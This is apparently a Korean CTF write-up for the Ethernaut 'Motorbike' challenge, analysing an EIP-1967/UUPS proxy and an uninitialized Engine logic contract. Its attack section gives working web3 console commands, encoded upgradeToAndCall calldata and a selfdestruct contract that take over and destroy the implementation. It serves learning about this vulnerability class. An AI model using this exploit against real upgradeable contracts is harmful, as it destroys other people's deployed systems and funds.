https://teberr.notion.site/Ethernaut-Motorbike-de4de8c038574c4882e3daceb692efab

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/276ec491-9eae-499b-80e9-7b522c5c7ca7/Untitled.png)

> 이더넛의 오토바이에는 새로운 업그레이드 가능한 엔진 디자인이 있습니다.

과연 당신은 selfdestruct 엔진을 작동시켜서 이 오토바이를 못쓰게 만들 수 있을까요?
> 
> 
> 힌트
> 
> - [EIP-1967](https://eips.ethereum.org/EIPS/eip-1967)
> - [UUPS](https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity-javascript/7786) upgradeable pattern
> - [Initializable](https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol) contract

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

# 코드 분석 및 공격 설계

### EIP-1967패턴

이번 문제는 업그레이드 가능한 프록시 패턴을 사용할 때 Storage Slot이 충돌이 일어나지 않도록 EIP-1967을 적용한 프록시 패턴이다. 

EIP-1967의 핵심 키워드는 프록시 컨트랙트와 Impl(로직)컨트랙트의 스토리지 슬롯 넘버가 겹치는 일 때문에 충돌이 일어난다는 점에서 슬롯 넘버가 겹치지 않도록 하고자 대처하는 방식이다. 

문제가 되었던 점을 상기해보자. 

proxy 컨트랙트에서 로직 컨트랙트로 fallback함수를 통해 delegatecall을 하기 위해서는 로직 컨트랙트의 주소를 알아야 하므로 이 값이 덮어씌워지면 안된다. 

또한 로직 컨트랙트를 업그레이드하기 위해서는 admin이어야 하므로 admin도 덮어 씌워지면 안된다.  

EIP-1967에서는 이러한 특수한 변수들을 로직 컨트랙트의 slot과 겹치지 않게 하기위해서 어떠한 방법을 사용하냐면 이러한 특수한 변수 이름을 keccak으로 해싱한 슬롯 위치에 저장하게 된다. 이로 인해서 Impl의 스토리지 슬롯 넘버와 겹치지 않게 한다. 

예를 들어 EIP-1967에서는 Impl(로직) 컨트랙트의 slot을 (keccak256(*"eip1967.proxy.implementation")-1) 에 저장한다.*

### Motorbike

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}
```

Motorbike 컨트랙트는 슬롯을 사용하지 않는다. _IMPLEMENTATION_SLOT 은 constant 이므로 컴파일 단계에서 이 _IMPLEMENTATION_SLOT를 사용하는 코드들은 전부 값이 치환되어서 컴파일된다.

```solidity
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }
```

프록시 컨트랙트가 생성될 때 로직 컨트랙트의 주소를 슬롯 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc 번째에 저장하고 이 로직 컨트랙트의 initialize()를 delegatecall로 실행한다. 이 initialize를 실행하면 delegatecall이므로 로직 컨트랙트의 슬롯에 업그레이드 할 수 있는 권한인 upgrader(슬롯0에 저장)가 되고 horsepower(슬롯1에 저장)값을 설정한다.

```solidity
    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
```

설명을 위해 사용자가 프록시를 통해 로직 컨트랙트의 함수를 호출하는 과정 순서대로 재배치하였다.

1. 사용자가 프록시에게 logic 컨트랙트의 함수를 msg.data로 호출한다.
2. 프록시에는 존재하지 않는 함수이므로 fallback()함수가 호출된다.
3. getAddressSlot 함수로 인해 로직 컨트랙트의 주소를 가져온다.
4. _delegate(Impl.address)가 실행되어 로직 컨트랙트에게 전달받은 abi를 전달하며 delegatecall로 실행시킨다. 

delegatecall로 실행되기 때문에 msg.sender, msg.value와 같은 context가 변경되지 않고 실행 결과의 슬롯은 프록시 컨트랙트가 영향을 받는다.

### Engine

```solidity
contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```

실제 로직 컨트랙트인 Engine 컨트랙트이다. 이 로직 컨트랙트에는 외부에서 호출할 수 있는 함수로 initializer()와 upgradeToAndCall 함수 두가지가 존재하며 나머지는 이 두 함수를 위한 내부 함수들이다. 이 컨트랙트에서는 로직컨트랙트에서 새로운 Impl 주소로 업그레이드하는 로직이 구현되어있다. 이렇게 로직 컨트랙트에서 업그레이드 함수가 구현되어 있는 방식이 UUPS업그레이드 방식이다.

```solidity
    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }
```

initialize 함수이다. 이 함수는 slot0에 저장되는 upgrader를 호출한 msg.sender로 변경해주고 slot1에 저장되는 horsePower를 1000으로 변경해준다. 

이 함수는 initializer가 붙어있는데 이는 실제 스토리지 역할을 하는 프록시에 상태변수 값이 저장되고 로직컨트랙트는 실제로 값을 저장하지 않으므로 초기화를 위한 생성자를 사용할 수 없다.(생성자를 사용하면 로직컨트랙트의 슬롯에 저장되므로) 따라서 한번만 호출할 수 있도록 initializer를 붙여서 호출이 되었던적이 있는지를 판별한다. initializer를 좀 더 살펴보면

```solidity
contract Initializable {

  /**
   * @dev Indicates that the contract has been initialized.
   */
  bool private initialized;

  /**
   * @dev Indicates that the contract is in the process of being initialized.
   */
  bool private initializing;

  /**
   * @dev Modifier to use in the initializer function of a contract.
   */
  modifier initializer() {
    require(initializing || isConstructor() || !initialized, "Contract instance has already been initialized");

    bool isTopLevelCall = !initializing;
    if (isTopLevelCall) {
      initializing = true;
      initialized = true;
    }
```

상태변수 initialized 값에 따라 이 값이 참이면 이미 initialize가 된 상태이므로 initialize()를 호출할 수 없게 하고 false면 아직 초기화가 안된 상태이므로 initialize()를 호출할 수 있게 한다.

이 initialize와 initializing 상태변수는 각각 bool타입이라 1바이트씩 차지하므로 address 타입인 upgrader와 함께 슬롯0에 존재하게 된다.

실제로 첫 슬롯을 살펴보면

```solidity
=> Level address
0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6

await web3.eth.getStorageAt(contract.address,0)
'0x000000000000000000003a78ee8462bd2e31133de2b8f1f9cbd973d6edd60001'
```

level address 부분을 빼고 보면

```solidity
'0x000000000000000000003a78ee8462bd2e31133de2b8f1f9cbd973d6edd6     00         01'
-------------------level address(upgrader)--------------------initialized-initializing
```

임을 확인하여 상태변수에 같이 저장된 값으로 초기화 여부를 판단하는 것을 알 수 있다.

```solidity
    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

```

새로운 로직 컨트랙트로 업그레이드한 후 그 로직컨트랙트에 data를 통해 delegatecall을 호출하는 함수이다. 이는 내부 함수로 작성이 되어있는데 이를 좀 더 살펴보자

```solidity

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
```

1. _authorizeUpgrade() 는 호출한 사람이 업그레이드권한이 있는 upgrader인지 확인한다.
2. upgradeToAndCall은 두단계로 구성된다.
    1. _setImplementation을 통해 지정된 슬롯 위치에 전달받은 새로운 로직컨트랙트의 주소를 저장한다.
    2. 전달받은 data가 있다면 새로운 로직컨트랙트에서 data에 담긴 함수+인자를 delegatecall한다.

우리의 목적은 selfdestruct를 실행시키는 것이므로 upgradeToAndCall을 통하여 selfdestruct가 존재하는 새로운 로직컨트랙트로 업그레이드한 후 selfdestruct가 실행되도록 하면 될것 같다.

이를 위해서는 upgrader 권한을 얻어야만 한다.

### 콘솔로 상호작용할 수 있는 컨트랙트

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ec0eabd9-df89-44a4-be51-65ee2030a80f/Untitled.png)

```solidity
await contract.abi
(2) [{…}, {…}]
0:{inputs: Array(1), stateMutability: 'nonpayable', type: 'constructor', constant: undefined, payable: undefined}
1:{stateMutability: 'payable', type: 'fallback', constant: undefined, payable: true}
length:2
[[Prototype]]:Array(0)
```

콘솔에서 상호작용할 수 있는 컨트랙트를 확인하기위해 abi를 확인해본 결과 constructor와 fallback이 설정되어 있는 것을 보면 콘솔로는 프록시 컨트랙트와 상호작용할 수 있다. 이 프록시 컨트랙트에서 로직 컨트랙트의 initialize()를 실행시키게 되면 msg.sender는 player이므로 upgrader 권한을 얻을 수 있을 것이다.

```solidity
await web3.eth.getStorageAt(contract.address,0)
'0x000000000000000000003a78ee8462bd2e31133de2b8f1f9cbd973d6edd600**01**'
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c0eaeb73-8bbf-4193-aaff-062979ab999f/Untitled.png)

하지만 이미 프록시 컨트랙트를 배포하면서 로직컨트랙트의 initialize를 실행하였기 때문에 slot 0의 마지막 1바이트를 보면 초기화가 된 적이 있다는 뜻으로 true값인 1이 저장되어 있어 initialize를 통해 upgrader 권한을 얻기를 실패한다. 

그렇다면 어떻게 Initialize를 직접 실행해서 한번만 실행되어야 하는 Initializer를 무시하고 실행할 수 있는가? 

그 답은 로직 컨트랙트의 주소로 직접 실행시키는 것이다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6e4e5a3-9180-448e-a469-119f669177fa/Untitled.png)

프록시를 거치면 초기화 여부를 판단하는 상태변수와 upgrader 상태변수가 proxy에 저장이 되어있고 delegatecall로 실행이 되기 때문에 프록시의 슬롯으로 판단하게 된다. 

하지만 우리는 로직 컨트랙트가 프록시의 몇번째 슬롯에 있는지 알고 있고 프록시를 거치지 않고 로직 컨트랙트의 주소로 initialize를 직접 호출하게 되면 이때의 슬롯은 로직 컨트랙트의 슬롯으로 판단하게 된다. 

따라서 현재 로직 컨트랙트에는 모든 슬롯이 0으로 채워져 있으므로(전부 프록시의 슬롯에 저장되어 있어서) 아직 초기화 여부를 판단하는 initialized 상태변수가 0으로 false 여서 initialize()를 실행시켜 upgrader 권한을 얻을 수 있게 된다. 

즉 공격은 다음과 같은 순서로 진행된다.

1. 프록시 컨트랙트의 _IMPLEMENTATION_SLOT에서 로직 컨트랙트의 주소를 알아낸다.
2. 로직 컨트랙트로 콘솔에서 직접 initialize()를 실행시켜 upgrader 권한을 얻는다.
    1. 이는 로직컨트랙트의 slot에 영향을 주는 것이다.
3. selfdestruct()가 존재하는 컨트랙트를 하나 작성한다.
4. 로직 컨트랙트의 upgradeToAndCall을 실행시켜서 내 컨트랙트를 로직 컨트랙트의 slot에 등록시키고(로직 컨트랙트의 슬롯에 영향이 가므로 proxy에는 영향 x) selfdestruct를 delegatecall 로 실행시킨다. 
    1. 이는 로직컨트랙트의 slot을 참조하여 upgrader 권한이 있음을 판단해야 하기 때문에 이 또한 프록시를 거치지 않고 직접 로직 컨트랙트로 data를 보내 호출해야 한다.

selfdestruct가 delegatecall로 실행되기 때문에 실제로 파괴되는 컨트랙트는 로직컨트랙트가 되어버린다. 따라서 로직컨트랙트(Engine)은 파괴가 되고 , 이 문제의 프록시 컨트랙트에는 로직 컨트랙트를 업그레이드 할 수 있는 함수가 존재하지 않으므로 이 프록시 컨트랙트도 사실상 무용지물이 되어버린다.

# 공격

우리는 프록시와 상호작용할 수 있으므로 프록시 컨트랙트의 _IMPLEMENTATION_SLOT 에 있는 로직 컨트랙트 주소를 알아낼 수 있다.

```solidity
await web3.eth.getStorageAt(contract.address,'0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
'0x0000000000000000000000006337edc5b6010cbab9a279b06f95c14387fec7a0'
------------------------------------------------------------------
impl='0x6337edc5b6010cbab9a279b06f95c14387fec7a0'
'0x6337edc5b6010cbab9a279b06f95c14387fec7a0'
```

실행해야 될 initialize()는 이더넛에서 abi를 제공해주고 있지 않으므로 트랜잭션의 함수 시그니쳐를 데이터에 담아서 실행시켜야 한다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a40d61b3-a6bc-4b88-a709-2a14bdccdde3/Untitled.png)

시그니쳐 값을 확인해보면 0x8129fc1c 임을 알 수 있다. 인자는 없으므로 시그니쳐 값만 데이터로 보내면 된다.

```solidity
data = '0x8129fc1c'
```

data로 저장해놓고 

```solidity
await web3.eth.sendTransaction({from:player, to: impl , data:data})
```

로직 컨트랙트의 initialize()를 실행시키는 트랜잭션을 발생시킨다.

그럼 이제 로직 컨트랙트의 스토리지에 upgrader와 horsepower이 상태변수 슬롯0,1에 저장되어 있는지 확인하자.

```solidity
await web3.eth.getStorageAt(impl,0)
'0x0000000000000000000083b26d6a3d3fabd9f0a5f1d69dca1ce6cc4ea39a0001'
await web3.eth.getStorageAt(impl,1)
'0x00000000000000000000000000000000000000000000000000000000000003e8'
```

의도한대로 로직 컨트랙트의 슬롯 0 upgrader에 내 메타마스크 주소가 들어가 있다. 프록시를 거치지 않고 로직 컨트랙트에 직접 upgradeToAndCall 함수를 실행시키면 로직 컨트랙트의 스토리지 슬롯0을 기반으로 권한이 있는지 검사하게 된다.

따라서 직접 실행시키기 위해 upgradeToAndCall(address,bytes memory)시그니쳐를 얻고자 하였으나 [https://sig.eth.samczsun.com/](https://sig.eth.samczsun.com/) 에서 안뜨길래 직접 컨트랙트를 통해서 확인하였다.

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

contract test{
    bytes public result;

    function encode() public {
        result = abi.encodeWithSignature("upgradeToAndCall(address,bytes)");
    }
}

--------------------------------------------------
result:
bytes: 0x4f1ef286
```

즉 시그니쳐 값은 0x4f1ef286임을 알 수 있다. 이를 통해서 upgardeToAndCall 함수를 실행할 수 있다. 이제 인자만 넣으면 된다.

이를 위하여 selfdestruct하는 컨트랙트를 생성하고 그 주소와 selfdestruct를 수행하는 함수의 시그니쳐를 인자로 전달해주면 된다.

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract MotorbikeAttack {
    function attack() public {
        selfdestruct(payable(address(0)));
    }
}
----------------------------------------------------
주소 : 0x1be47df4400ee907328897d547781D5A6DA419d3
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/15ea44c9-9c2b-46ff-a121-fb5f813afded/Untitled.png)

새롭게 impl로 해줄 공격컨트랙트의 주소는 0x1be47df4400ee907328897d547781D5A6DA419d3, attack()의 시그니쳐는 0x9e5faafc이다. 

이를 [https://adibas03.github.io/online-ethereum-abi-encoder-decoder/#/encode](https://adibas03.github.io/online-ethereum-abi-encoder-decoder/#/encode)온라인 인코더를 통해서 abi 인코딩을 해준다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/78719240-7d90-4181-9761-bc60f67bccd2/Untitled.png)

```solidity
0000000000000000000000001be47df4400ee907328897d547781d5a6da419d3000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000049e5faafc00000000000000000000000000000000000000000000000000000000
```

따라서 각 인자는 32바이트로 위와 같이 표현된다. 이제 이를 시그니쳐 뒤의 인자로 붙여서 data에 넣어주자.

```solidity
    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
```

그리고 이 트랜잭션을 실행하면 로직 컨트랙트에서 우리가 만든 공격 컨트랙트의 selfdestruct(payable(address(0))이 delegatecall로 인해 로직 컨트랙트에서 실행되어 문제의 목적대로 로직 컨트랙트(Engine)가 파괴될 것이다.

```solidity
data2_temp ='0x4f1ef2860000000000000000000000001be47df4400ee907328897d547781d5a6da419d3000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000049e5faafc00000000000000000000000000000000000000000000000000000000'

await web3.eth.sendTransaction({from:player, to: impl , data:data2_temp})

```

트랜잭션을 통해 upgradeToAndCall(0x1be47df4400ee907328897d547781D5A6DA419d3,0x9e5faafc)를 실행한다.

그러면 selfdestruct로 인해 로직 컨트랙트가 파괴되면서 스토리지 슬롯에 들어있던 값들이 0으로 변경되었을 것이므로 확인해본다.

```solidity
await web3.eth.getStorageAt(impl,0)
'0x0000000000000000000000000000000000000000000000000000000000000000'
```

정상적으로 파괴된 것을 확인할 수 있다. 이제 업그레이드 기능이 있는 로직 컨트랙트가 없어졌으므로 이제 프록시에서는 새로운 로직 컨트랙트로 연결할 수 없으며 사실상 무용지물이 된다. 이제 문제 목적을 달성하였으므로 인스턴스를 제출해주면 성공했음을 확인할 수 있다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf9fa535-ceda-4684-b91b-c8b2cf732f75/Untitled.png)

# 후기

UUPS 패턴을 사용하는 이점은 배포를 위한 프록시를 최소화할 수 있다는 것이다. 프록시는 스토리지 계층 역할을 하고 로직컨트랙트는 delegatecall을 통해서 오로지 로직만 사용되기 때문에 로직 컨트랙트의 상태변수 수정은 프록시에게 악영향을 미치지 않는다. (어차피 프록시를 통해서 호출하면 프록시의 스토리지 슬롯만 고려하므로)

하지만 이것이 로직 컨트랙트가 초기화되지 않았을 때 생길 수 있는 취약점을 간과해야한다는 것은 아니다. 이 문제는 UUPS 패턴이 나온지 몇달 이내에 실제로 발생했던 문제를 간략화 한 문제이다. 로직 컨트랙트를 초기화되지 않은 상태로 놓아두지 않는 것은 중요하다. 더 자세히 알고 싶다면 [here](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680)에서 자세히 볼 수 있다.
